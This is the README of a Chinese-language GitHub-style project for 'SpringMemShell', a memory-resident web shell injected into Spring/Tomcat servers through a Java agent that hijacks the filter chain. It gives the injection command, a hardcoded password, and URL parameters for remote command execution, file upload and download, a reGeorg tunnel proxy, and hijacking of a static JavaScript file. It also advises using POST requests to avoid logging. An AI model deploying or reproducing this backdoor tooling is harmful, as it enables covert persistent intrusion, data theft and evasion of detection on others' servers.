# SpringMemShell

由于本人是条懒狗，具体的使用说明请以`/?password=stdout&model=help`为准。（主要是我改了代码之后不想动前面的markdown。。。）



## 原理

和`tomcat`内存马的原理类似，也是劫持了一个`filter`，这里修改的是`org.apache.catalina.core.ApplicationFilterChain$internalDoFilter` <br/>





## 使用步骤

>   至少应该先访问一次，确保`org.apache.catalina.core.ApplicationFilterChain`被加载

1.  将三个jar包放入靶机中，这里使用了`vulhub/spring/CVE-2018-1273`作为例子

    ![image-20210317142736836](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210317142736836-20210409143828374.png)

2.  找到目标进程的pid（在docker中的pid通常为1）

    

3.  执行`java -jar javaAgent.jar [pid] "./mem.jar"`命令

    ![image-20210317143338934](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210317143338934-20210409143829176.png)

4.  注入成功，访问任意路由（不存在的也行） 加上参数`?password=stdout&model=exec&cmd=[command]`即可

    <font color='red'>get请求容易被日志记录下来，采用post请求相对来说不容易被发现</font>

    查看一下注入之后的`/proc/self/maps`

    ![image-20210317143739861](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210317143739861-20210409143830039.png)

    可以看到两个jar包进入了内存



## 效果

注入内存马之前

![image-20210317143205942](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210317143205942-20210409143831820.png)



注入之后

![image-20210317143804052](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210317143804052-20210409143833243.png)



由于是在`filter`层处理了用户请求，即使路由没有定义，也没有关系。



## 新功能+1

应hzgg的要求，加入新功能：静态页面劫持

本想着新建一条路由（在`Controller`层）去做，但是由于Spring的MVC结构，在没有`templates`的情况下不能直接渲染页面。而后听从建议，在`Filter`层就做好。

关键源代码如下

```java
String uri = request.getRequestURI();
if (uri.equals("/app.js")) {
    result += com.shiroha.springMem.SpringMemModels.readSource("1.js");
    response.getWriter().write(result);
    return;
}
```

当访问目标的`/app.js`的时候，在`filter`层就会被响应，返回`1.js`的内容。

```javascript
// 1.js
alert(1);
```



示例效果：

![image-20210323160138849](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210323160138849-20210409143833905.png)





## 新功能+2

需求增加：“既然你加载了这个agent，那要把卸载也做好啊”。

由于Java agent是注入到内存，并且修改了class，完全移除只有重启jar包这个方法（当然，也可能是我才疏学浅）。因此我想的解决方案是还原改写的方法。但是由于`javassist`编译的特殊性，完全还原是太不能做得到的。所以我换了个注入的函数`doFilter`，这个函数内容简单，还原方便，简直是不二选择。



效果演示

注入内存马之后：

![image-20210324181759730](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210324181759730-20210409143835147.png)

使用`?password=stdout&model=exit`，暂时解除修改的数据。

![image-20210324181912659](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210324181912659-20210409143835558.png)

再次执行命令就会失败：

![image-20210324181940085](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210324181940085-20210409143835909.png)

使用`?restart=restart`再次启用修改：

![image-20210324182015489](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210324182015489-20210409143836215.png)

再次可以执行命令：

![image-20210324182126043](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210324182126043-20210409143836484.png)

<font color='red'>这期间不会影响到业务。</font>



## 新功能+3

增加了regeorg 代理，由于最新的regeorg使用了变形base64加密，所有的字段名和值都发生了变化，导致换密码很麻烦——需要把tunnel.jsp的代码分别复制到B64类和SpringProxy类中，相信聪明的你一定会改。

我的密码是stdout。

之后可能会去研究一下变种的过程，搞一个自动一点的出来。

使用`python3 neoreg.py --url "http://target/?password=stdout&model=proxy" -k "stdout"`即可。

效果示例：

![image-20210412134149838](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210412134149838.png)

![image-20210412141215288](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210412141215288.png)



## 新功能+4

支持文件上传和下载

### 上传

访问`/?password=stdout&model=file`即可看到文件上传

![image-20210413175757797](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210413175757797.png)

例如：

-   path： `/tmp/1.js`
-   file: `Mgo=`
-   mode: `overwrite`

会把`Mgo=`进行base64解密之后写入`/tmp/1.js`中。

由于文件大小限制，大文件（大于1M）切块之后用append模式进行上传。



### 下载

`/?password=stdout&model=file&action=download&path=[path]`

就会下载path指向的文件

例如：

-   path=`/tmp/1.js`

